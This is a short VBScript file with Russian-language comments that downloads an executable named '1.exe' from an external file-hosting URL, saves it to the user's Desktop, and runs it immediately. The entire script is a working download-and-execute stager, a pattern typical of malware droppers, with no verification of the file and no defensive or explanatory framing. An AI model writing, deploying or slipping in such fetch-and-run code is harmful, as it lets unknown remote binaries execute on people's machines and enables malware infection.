Dim objXMLHTTP, objADOStream, objFSO, objShell
Dim fileURL, localFilePath, fileName

' URL файла для скачивания
fileURL = "https://diskcitylink.com/6CsDzZK/1.exe"

' Имя файла (известно заранее)
fileName = "1.exe"

' Создание объекта FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Локальный путь для сохранения файла (на рабочем столе)
Set objShell = CreateObject("WScript.Shell")
localFilePath = objShell.SpecialFolders("Desktop") & "\" & fileName

' Создание объекта XMLHTTP
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")

' Создание объекта ADOStream
Set objADOStream = CreateObject("ADODB.Stream")

' Открытие URL файла
objXMLHTTP.Open "GET", fileURL, False
objXMLHTTP.Send

' Сохранение файла в текущем рабочем каталоге
If objXMLHTTP.Status = 200 Then
    objADOStream.Open
    objADOStream.Type = 1 ' Бинарные данные
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0

    ' Запись данных в файл с именем из URL
    objADOStream.SaveToFile localFilePath
    objADOStream.Close
End If

' Запуск скачанного файла (если файл успешно скачан)
If objFSO.FileExists(localFilePath) Then
    objShell.Run localFilePath
End If

' Освобождение ресурсов
Set objXMLHTTP = Nothing
Set objADOStream = Nothing
Set objFSO = Nothing
Set objShell = Nothing
